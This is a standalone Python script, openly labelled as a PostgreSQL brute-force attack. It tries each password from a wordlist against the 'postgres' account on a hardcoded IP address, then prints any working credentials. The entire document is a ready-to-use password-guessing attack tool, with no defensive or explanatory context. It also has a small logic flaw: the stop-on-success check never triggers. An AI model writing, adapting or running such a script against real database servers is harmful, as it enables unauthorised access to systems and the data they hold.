#!/usr/bin/python
import pgdb

username = 'postgres'
target = '11.11.11.171'
porttarget = 5432
dbtarget = 'postgres'
verbose = True

print('=' * 70)
print('PostgreSQL BRUTEFORCE ATTACK')
print('=' * 70)
print()

def bruteforceattack(_target,_user,_pwd,_porttarget,_dbtarget):
    try:
        psqlconn = pgdb.Connection(user = _user, password = _pwd, host = _target, port = _porttarget, database = _dbtarget)
        psqlconn.close()
        print('[+] BINGO - username:', _user, 'password:', _pwd, 'Database:', _dbtarget)

    except:
        if verbose:
            print('[-] FAIL  - username:', _user, 'password:', _pwd, 'Database:', _dbtarget)


def user_wordlist(_target,_user,_wordlist, _porttarget, _dbtarget):
    with open(_wordlist, 'r') as _word:
        for _line in _word:
            _pwd = _line.strip('\n')

            bingo=bruteforceattack(_target,_user,_pwd,_porttarget,_dbtarget)
            
            if bingo:
                break

user_wordlist(target, username, 'word.txt', porttarget, dbtarget)
print()
print('=' * 70)

